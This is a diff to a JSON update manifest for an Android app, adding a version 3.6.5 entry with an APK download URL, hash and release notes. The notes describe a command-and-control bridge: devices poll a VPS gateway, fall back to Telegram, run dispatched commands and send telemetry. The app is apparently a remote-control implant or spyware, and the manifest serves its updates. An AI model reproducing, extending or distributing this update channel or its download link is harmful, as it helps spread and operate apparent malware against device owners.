@@ -1,5 +1,16 @@
 [
   {
+    "versionCode": 61,
+    "versionName": "3.6.5",
+    "releaseDate": "2026-09-25",
+    "fileName": "pasa-v3.6.5-61.apk",
+    "downloadUrl": "https://pasa.izhaanintellect.fun/releases/pasa-v3.6.5-61.apk",
+    "sha256": "4462e8bd042461befcbb6ec61ee85f0edb8b03c5a253b3434dccbb8bd5797d0b",
+    "size": 19200892,
+    "mandatory": false,
+    "releaseNotes": "v3.6.5: Dual-Channel C2 Bridge & Universal Callback Command Dispatcher — Reconnects device to VPS Gateway queue (/api/device/poll) for instant telemetry response, restores intelligent Telegram fallback, adds full callback_query support for inline buttons, and refreshes device heartbeat."
+  },
+  {
     "versionCode": 60,
     "versionName": "3.6.4",
     "releaseDate": "2026-09-25",
